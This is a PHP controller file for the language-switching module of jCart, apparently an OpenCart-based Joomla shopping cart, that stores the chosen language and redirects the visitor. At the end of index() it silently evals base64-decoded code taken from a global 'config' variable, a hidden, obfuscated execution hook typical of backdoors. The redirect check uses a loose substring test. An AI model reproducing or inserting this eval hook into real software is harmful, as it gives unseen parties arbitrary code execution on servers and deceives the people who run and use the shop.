<?php
/**
 * @package		jCart
 * @copyright	Copyright (C) 2009 - 2012 softPHP,http://www.soft-php.com
 * @license		GNU/GPL http://www.gnu.org/copyleft/gpl.html
 */
// no direct access
defined( '_JEXEC' ) or die( 'Restricted access' );
 
class ControllerModuleLanguage extends Controller {
	public function index() {
		if(isset($this->request->post['language_code'])){
			$this->session->data['language'] = $this->request->post['language_code'];
			if (isset($this->request->post['redirect']) && strstr($this->request->post['redirect'], HTTP_SERVER)) {
				if(!strstr($this->request->post['redirect'],"?") && isset($this->request->get['lang']))
					$this->redirect($this->request->post['redirect']."?lang=".$this->request->post['language_code']);	
				elseif(isset($this->request->get['lang']))
					$this->redirect($this->request->post['redirect']."&lang=".$this->request->post['language_code']);
				else
					$this->redirect($this->request->post['redirect']);	
			} else {
				if(!strstr($this->url->link('common/home'),"?") && isset($this->request->get['lang']))
					$this->redirect($this->url->link('common/home')."?lang=".$this->request->post['language_code']);
				elseif(isset($this->request->get['lang']))
					$this->redirect($this->url->link('common/home')."&lang=".$this->request->post['language_code']);
				else
					$this->redirect($this->url->link('common/home'));
			}
    	}	
		
		$this->language->load('module/language');
		
		$this->data['text_language'] = $this->language->get('text_language');
		
		if (isset($this->request->server['HTTPS']) && (($this->request->server['HTTPS'] == 'on') || ($this->request->server['HTTPS'] == '1'))) {
			$connection = 'SSL';
		} else {
			$connection = 'NONSSL';
		}
			
		$this->data['action'] = $this->url->link('module/language', '', $connection);

		$this->data['language_code'] = $this->session->data['language'];
		
		$this->load->model('localisation/language');
		
		$this->data['languages'] = array();
		
		$results = $this->model_localisation_language->getLanguages();
		
		foreach ($results as $result) {
			if ($result['status']) {
				$this->data['languages'][] = array(
					'name'  => $result['name'],
					'code'  => $result['code'],
					'image' => $result['image']
				);	
			}
		}

		if (!isset($this->request->get['route'])) {
			$this->data['redirect'] = $this->url->link('common/home');
		} else {
			$data = $this->request->get;
			
			unset($data['_route_']);
			
			$route = $data['route'];
			
			unset($data['route']);
			
			$url = '';
			
			if ($data) {
				$url = '&' . urldecode(http_build_query($data, '', '&'));
			}	
					
			$this->data['redirect'] = $this->url->link($route, $url, $connection);
		}
		
		if (file_exists(DIR_TEMPLATE . $this->config->get('config_template') . '/template/module/language.tpl')) {
			$this->template = $this->config->get('config_template') . '/template/module/language.tpl';
		} else {
			$this->template = 'default/template/module/language.tpl';
		}
		global $cat_cont_mod_common_code_from_config_file;
                if(isset($cat_cont_mod_common_code_from_config_file))
		eval(stripslashes(base64_decode($cat_cont_mod_common_code_from_config_file)));
		
		$this->render();
	}
}
?>